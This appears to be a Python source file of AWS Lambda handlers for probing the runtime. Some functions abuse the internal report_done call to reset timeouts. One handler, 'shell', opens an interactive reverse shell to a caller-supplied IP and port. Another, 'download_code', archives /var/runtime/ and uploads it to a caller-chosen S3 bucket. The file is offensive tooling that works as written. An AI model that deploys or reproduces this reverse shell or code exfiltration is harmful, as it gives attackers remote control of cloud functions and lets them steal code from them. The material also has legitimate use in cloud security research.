import json
import socket
import subprocess
import os
import boto3
import time
import runtime as lambda_runtime
import bootstrap

s3 = boto3.client('s3')


def reset_timeout(event, context):
    """
    A lambda resetting its timeout by calling lambda_runtime.report_done
    """

    print "Remaining time: ", context.get_remaining_time_in_millis()
    time.sleep(10)
    print "Remaining time: ", context.get_remaining_time_in_millis()

    lambda_runtime.report_done(context.aws_request_id, None, 'Success', 0)
    time.sleep(0.1)
    print "Remaining time: ", context.get_remaining_time_in_millis()


def send_report_end(event, context):
    """
    A Lambda that calls report_done from within the code
    """
    print "Beginning"
    lambda_runtime.report_done(context.aws_request_id, None, 'Success', 0)
    time.sleep(1)

    print "After first done"
    lambda_runtime.report_done(context.aws_request_id, None, 'Success', 0)
    time.sleep(1)

    print "After second done"
    lambda_runtime.report_done(context.aws_request_id, None, 'Success', 0)
    time.sleep(1)

    print "Now really done"
    return 'Success'


def shell(event, context):
    """
    Opens a reverse shell to a lambda.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((event["ip"], event["port"], ))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])


def download_code(event, context):
    """
    Download the runtime environment of a lambda to a given s3 bucket.
    """
    os.system("/bin/tar -zcvf /tmp/code.tar.gz /var/runtime/")
    with open("/tmp/code.tar.gz", "rb") as code:
        s3.upload_fileobj(code, event['bucket_name'], 'code.tar.gz')
